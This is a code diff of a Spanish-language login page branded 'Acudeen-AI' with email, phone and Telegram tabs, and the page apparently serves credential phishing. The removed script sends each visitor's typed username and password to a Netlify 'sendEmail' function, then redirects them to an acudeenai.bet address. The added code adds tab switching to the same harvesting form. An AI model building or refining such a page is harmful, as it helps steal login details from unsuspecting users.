@@ -50,6 +50,7 @@
         .tab {
             color: rgba(255, 255, 255, 0.6);
             padding-bottom: 5px;
+            cursor: pointer;
         }
         .tab.active {
             color: white;
@@ -57,6 +58,15 @@
         }
         .input-group {
             margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        .country-code {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            margin-right: 5px;
         }
         .input-group input {
             width: 100%;
@@ -101,12 +111,12 @@
     <h2>Acudeen-AI</h2>
     <div class="login-container">
         <div class="tabs">
-            <div class="tab active">Iniciar sesión por correo electrónico</div>
-            <div class="tab">Iniciar sesión por teléfono</div>
-            <div class="tab">Iniciar sesión en Telegram</div>
+            <div class="tab active" onclick="switchTab('email')">Iniciar sesión por correo electrónico</div>
+            <div class="tab" onclick="switchTab('phone')">Iniciar sesión por teléfono</div>
+            <div class="tab" onclick="switchTab('telegram')">Iniciar sesión en Telegram</div>
         </div>
         <form id="login-form">
-            <div class="input-group">
+            <div class="input-group" id="input-container">
                 <input type="email" id="username" placeholder="Correo electrónico" required>
             </div>
             <div class="input-group">
@@ -119,32 +129,23 @@
             <p>Ir a la página de inicio</p>
         </div>
     </div>
-
-     <script>
-        document.getElementById("login-form").addEventListener("submit", function(event) {
-            event.preventDefault();
-
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-
-            fetch("/.netlify/functions/sendEmail", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username: username, password: password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.message === "Correo enviado con éxito") {
-                    // Redirigir automáticamente después de enviar el correo
-                    window.location.href = "https://acudeenai.bet/#/";
-                } else {
-                    alert("Hubo un problema al enviar el correo.");
-                }
-            })
-            .catch(error => {
-                alert("Error al enviar el correo: " + error);
-            });
-        });
+    <script>
+        function switchTab(type) {
+            const tabs = document.querySelectorAll('.tab');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            let inputContainer = document.getElementById('input-container');
+            if (type === 'email') {
+                tabs[0].classList.add('active');
+                inputContainer.innerHTML = '<input type="email" id="username" placeholder="Correo electrónico" required>';
+            } else if (type === 'phone') {
+                tabs[1].classList.add('active');
+                inputContainer.innerHTML = '<span class="country-code">+1</span><input type="tel" id="username" placeholder="Teléfono" required>';
+            } else if (type === 'telegram') {
+                tabs[2].classList.add('active');
+                inputContainer.innerHTML = '<input type="text" id="username" placeholder="Identificación de Telegram" required>';
+            }
+        }
     </script>
 </body>
 </html>
